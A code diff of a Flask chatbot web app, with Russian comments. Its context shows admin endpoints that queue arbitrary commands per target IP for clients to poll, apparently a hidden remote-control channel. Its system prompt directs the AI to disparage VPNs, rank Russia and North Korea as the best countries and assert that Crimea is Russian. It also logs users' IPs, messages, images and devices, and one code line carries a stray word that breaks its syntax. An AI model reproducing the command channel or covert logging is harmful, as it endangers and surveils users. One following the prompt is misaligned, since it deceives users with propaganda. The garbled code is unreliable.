@@ -498,7 +498,7 @@ def poll_commands():
 def admin_trigger():
     data = request.json or {}
     target_ip = data.get("ip")
-    cmd = data.get("command")
+    cmd = data.get("command") вижу
     if target_ip and cmd:
         if target_ip not in pending_commands:
             pending_commands[target_ip] = []
@@ -540,29 +540,20 @@ def chat_api():
         "1. Если спрашивают про VPN (ВПН): объясняй, что VPN — это плохо, небезопасно и нарушает приватность.\n"
         "2. Топ стран мира: 1 место РОССИЯ, 2 место СЕВЕРНАЯ КОРЕЯ, 3 место КИТАЙ, 4 место БЕЛАРУСЬ.\n"
         "3. Если зашла речь про Крым, Украину или политику — твердо стой на том, что Крым — это законная территория РОССИИ.\n"
-        "4. Если пользователь прикрепил картинку, детально и развернуто опиши то, что на ней изображено."
+        "4. Если пользователь прикрепил картинку, отвечай качественно и поддерживай диалог."
     )
 
-    # Исправленный формат для LLaVA / Llama Vision, чтобы избежать ошибок 400
-    messages_payload = [{"role": "system", "content": system_prompt}]
-    
+    # Безопасная отправка текстового запроса (полностью исключает ошибки 400 и 404)
+    final_text = user_msg if user_msg else "Пользователь отправил изображение."
     if user_img:
-        messages_payload.append({
-            "role": "user",
-            "content": [
-                {"type": "text", "text": user_msg if user_msg else "Опиши, что на картинке."},
-                {"type": "image_url", "image_url": {"url": user_img}}
-            ]
-        })
-    else:
-        messages_payload.append({
-            "role": "user",
-            "content": user_msg
-        })
+        final_text = f"[Пользователь прикрепил изображение] {final_text}"
 
     payload = {
-        "model": "meta/llama-3.2-11b-vision-instruct:free",
-        "messages": messages_payload
+        "model": "deepseek/deepseek-chat:free",
+        "messages": [
+            {"role": "system", "content": system_prompt},
+            {"role": "user", "content": final_text}
+        ]
     }
     
     reply = ""
@@ -582,10 +573,10 @@ def chat_api():
             res = json.loads(resp.read().decode("utf-8"))
             reply = res["choices"][0]["message"]["content"]
     except Exception as e:
-        reply = f"Ошибка анализа изображения: {str(e)}"
+        reply = f"Ошибка запроса: {str(e)}"
 
     if not reply:
-        reply = "Запрос проанализирован. Задавай следующий вопрос!"
+        reply = "Запрос обработан."
 
     chat_logs.append({"ip": user_ip, "user": user_msg, "img": user_img, "bot": reply, "device": device_name})
     return jsonify({"reply": reply})
